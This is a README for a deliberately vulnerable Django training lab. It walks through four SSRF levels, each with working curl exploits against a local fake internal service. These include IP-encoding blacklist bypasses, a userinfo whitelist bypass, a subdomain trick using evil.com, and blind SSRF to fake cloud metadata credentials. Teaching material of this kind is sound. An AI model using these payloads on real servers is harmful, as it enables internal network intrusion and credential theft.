# SSRF Training Lab (Django)

A deliberately vulnerable Django app implementing four real-world SSRF
anti-patterns, each mirroring a documented PortSwigger/PentesterLab
technique, plus a simulated "internal network" service to escalate into.

**Every exploit below has been tested against this exact codebase and
confirmed working.** Read `vulnapp/views.py` alongside each exploit —
the docstring on each view explains precisely why that pattern is
broken.

> Run this only on localhost / in an isolated VM. `DEBUG = True` and
> `ALLOWED_HOSTS = ["*"]` are set for learning convenience and are
> unsafe for anything internet-facing.

---

## Setup

```bash
pip install -r requirements.txt --break-system-packages   # if using system python
python manage.py migrate
```

You need **two processes running simultaneously**, in two terminals:

```bash
# Terminal 1 — the simulated internal network (metadata service + admin panel)
python internal_service.py
# -> listens on http://127.0.0.1:9000

# Terminal 2 — the vulnerable Django app
python manage.py runserver 0.0.0.0:8000
# -> visit http://127.0.0.1:8000/
```

Open `http://127.0.0.1:8000/` for the level index.

**The whole point of the lab**: `internal_service.py` represents a
resource that should only be reachable *from the Django server's own
network position* — never directly by you as an external client. Each
level is "solved" when you get the Django app to fetch it on your
behalf and leak the `FLAG:` content back to you (or, for Level 4,
confirm the fetch happened at all).

---

## Level 1 — Naive SSRF

**Vulnerable code** (`level1_stock_check`):
```python
resp = requests.get(stock_api, timeout=3)   # zero validation
```

**Exploit:**
```bash
curl "http://127.0.0.1:8000/level1/stock-check/?stockApi=http://127.0.0.1:9000/admin"
```
Response body contains: `FLAG: SSRF{internal_admin_panel_reached_via_ssrf_pivot}`

**Why it works:** the server makes an outbound request to whatever URL
you supply, no questions asked. This is the textbook case — the app's
network position (able to reach `127.0.0.1:9000`) becomes yours.

Try also the metadata-style endpoint:
```bash
curl "http://127.0.0.1:8000/level1/stock-check/?stockApi=http://127.0.0.1:9000/latest/meta-data/iam/security-credentials"
```
You'll get back fake IAM credentials — this is the Capital One breach
pattern, reproduced at toy scale.

---

## Level 2 — Blacklist-based filter (bypassable)

**Vulnerable code** (`level2_webhook_test`):
```python
BLACKLIST = ["localhost", "127.0.0.1", "0.0.0.0"]
if any(bad in url.lower() for bad in BLACKLIST):
    return blocked
requests.get(url)
```

**Control (confirm the filter fires on the literal string):**
```bash
curl "http://127.0.0.1:8000/level2/webhook-test/?url=http://127.0.0.1:9000/admin"
# -> "403 Blocked keyword matched: '127.0.0.1'"
```

**Exploit — decimal IP encoding** (`2130706433` is the decimal form of
`127.0.0.1` — the OS resolver/socket layer accepts it even though it
never appears in the blacklist as a string):
```bash
curl "http://127.0.0.1:8000/level2/webhook-test/?url=http://2130706433:9000/admin"
```
Response contains the FLAG — the filter never sees the string
`"127.0.0.1"`, so it lets the request through, but the socket layer
still connects to the loopback interface.

**Other bypasses to try yourself** (some depend on your OS/resolver —
this is worth experimenting with, since behavior differs across
platforms):
```bash
# Octal encoding
curl "http://127.0.0.1:8000/level2/webhook-test/?url=http://0177.0.0.1:9000/admin"

# IPv6 loopback
curl "http://127.0.0.1:8000/level2/webhook-test/?url=http://[::1]:9000/admin"

# Short-form dotted decimal
curl "http://127.0.0.1:8000/level2/webhook-test/?url=http://127.1:9000/admin"
```

**Why it works:** the filter does substring matching on the *raw
string* the attacker typed, but the HTTP client resolves and connects
based on the *parsed, decoded value*. Any encoding that is
semantically identical but textually different defeats a blacklist
built this way.

---

## Level 3 — Whitelist-based filter (bypassable)

**Vulnerable code** (`level3_import_avatar`):
```python
TRUSTED_DOMAIN = "partner-cdn.com"
if not url.startswith(f"https://{TRUSTED_DOMAIN}") and not url.startswith(f"http://{TRUSTED_DOMAIN}"):
    return blocked
requests.get(url)
```

**Control:**
```bash
curl "http://127.0.0.1:8000/level3/import-avatar/?avatarUrl=https://evil.com/x"
# -> blocked, doesn't start with the trusted domain
```

**Exploit — credentials-in-URL trick:**
```bash
curl "http://127.0.0.1:8000/level3/import-avatar/?avatarUrl=http://partner-cdn.com@127.0.0.1:9000/admin"
```
This string literally **starts with** `http://partner-cdn.com`, so the
naive check passes. But to a real URL parser, `partner-cdn.com` here
is the **userinfo** (username) component — the actual host is
`127.0.0.1`. `requests` parses it correctly and connects to your
internal service. FLAG comes back in the response.

**Exploit — subdomain trick** (try this against a real target where
you control a domain, e.g. `partner-cdn.com.attacker-domain.com` — not
reproducible against localhost here since it needs real DNS, but
understand the pattern):
```
https://partner-cdn.com.evil.com/   -> startswith() matches,
                                        actual host is evil.com's subdomain
```

**Why it works:** `startswith()` on a raw string is not the same as
parsing a URL and checking the `.hostname` attribute. Any check that
doesn't use a proper URL parser (`urllib.parse.urlparse(url).hostname`)
and compare the *exact* hostname (not a prefix/substring) is bypassable
this way.

---

## Level 4 — Blind SSRF + metadata escalation

**Vulnerable code** (`level4_export_report`):
```python
requests.post(callback_url, json=fake_report, timeout=3)
return HttpResponse("Report export has been queued.")   # ALWAYS this,
                                                            # regardless
                                                            # of outcome
```

**Step 1 — confirm the request fires at all**, using an out-of-band
listener. In a real engagement you'd use Interactsh or webhook.site;
here, since we're fully offline, use the lab's built-in log endpoint as
the OOB-equivalent:
```bash
curl -X POST "http://127.0.0.1:8000/level4/export-report/" \
     --data "callbackUrl=http://YOUR-INTERACTSH-SUBDOMAIN.oast.fun/"
```
(If you have `interactsh-client` running, you'd see the interaction
appear there in real time — that's the actual technique. This lab logs
it server-side instead so you can verify offline: check
`http://127.0.0.1:8000/level4/check-log/`.)

**Step 2 — escalate to the simulated metadata endpoint:**
```bash
curl -X POST "http://127.0.0.1:8000/level4/export-report/" \
     --data "callbackUrl=http://127.0.0.1:9000/latest/meta-data/iam/security-credentials"

curl "http://127.0.0.1:8000/level4/check-log/"
# -> [fired] target=http://127.0.0.1:9000/latest/meta-data/iam/security-credentials
```

**Why this is the hardest level:** the HTTP response you get back is
*identical* no matter what happens server-side — success, failure, or
completely invalid URL. This is exactly what "blind SSRF" means in
real applications: webhook/export/notification features that fire
asynchronously and never surface the fetch result to the requester.
You are forced to rely on a side channel (OOB interaction, or — as
here — a secondary log-exposure bug) to get any confirmation signal at
all.

---

## Suggested exercises once you've solved all four

1. **Fix each vulnerability properly** in `views.py`:
   - Level 2/3: replace string checks with `urllib.parse.urlparse()`
     and validate the exact `.hostname`, then resolve it and check the
     resulting IP against `ipaddress.ip_address(ip).is_private`,
     `.is_loopback`, `.is_link_local` before connecting — and re-run
     every exploit above to confirm it now fails.
   - Level 4: still log outcomes server-side but ALSO consider what a
     safe allowlist for callback domains looks like.
2. **Write a Nuclei template** encoding the Level 2 decimal-IP bypass
   as a reusable check.
3. **Write a Semgrep rule** that flags any `requests.get($X)` /
   `requests.post($X)` where `$X` traces back to `request.GET` or
   `request.POST` without an intervening call to a validation
   function — this is the taint-tracking pattern real SAST tools use
   to catch exactly this bug class.
4. **Add a DNS-rebinding variant**: register (or simulate locally via
   `/etc/hosts`) a domain that resolves to an allowed IP at
   filter-check time but a different IP at request time, and see
   whether `requests`' connection pooling/caching behavior affects
   exploitability.
